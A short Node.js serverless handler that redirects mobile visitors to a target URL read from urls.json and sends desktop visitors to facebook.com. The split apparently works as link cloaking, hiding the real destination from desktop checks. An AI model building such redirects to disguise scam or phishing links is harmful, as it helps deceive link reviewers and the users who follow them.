// @ts-nocheck
const fs = require("fs");
const path = require("path");

module.exports = (req, res) => {
  const ua = req.headers["user-agent"] || "";
  const isMobile = /Mobi|Android|iPhone/i.test(ua);

  const filePath = path.join(__dirname, "..", "urls.json");
  const rawData = fs.readFileSync(filePath);
  const urls = JSON.parse(rawData);

  const mobileUrl = urls.mobileTargetUrl;
  const desktopUrl = "https://facebook.com";

  res.writeHead(302, {
    Location: isMobile ? mobileUrl : desktopUrl,
  });
  res.end();
};
